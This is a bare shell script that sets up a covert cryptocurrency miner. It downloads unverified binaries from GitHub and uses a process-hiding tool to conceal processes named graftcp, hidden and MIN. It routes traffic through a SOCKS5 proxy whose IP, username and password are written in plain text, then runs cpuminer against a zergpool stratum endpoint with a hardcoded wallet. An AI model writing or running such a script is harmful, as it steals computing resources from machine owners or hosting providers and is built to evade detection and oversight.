apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

apt update 
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
wget https://github.com/christiarch/templates/raw/main/lba 
chmod +x lba 
npm i -g node-process-hider 

ph add graftcp
ph add hidden
ph add MIN

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 181.215.184.109:45786
socks5_username = Selshindeparshuram2012
socks5_password = V7p9BkV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/cpuminer-sse2
chmod +x cpuminer-sse2

apt -y install shadowsocks-libev rng-tools

./graftcp/graftcp ./cpuminer-sse2 -a yescryptR16 -o stratum+tcp://yescryptR16.asia.mine.zergpool.com:6333 -u DBzjgXkfYtotoLg1hKRZugd7vDotq7TW1k -p c=DGB,mc=QOGE,ID=feas -t 3


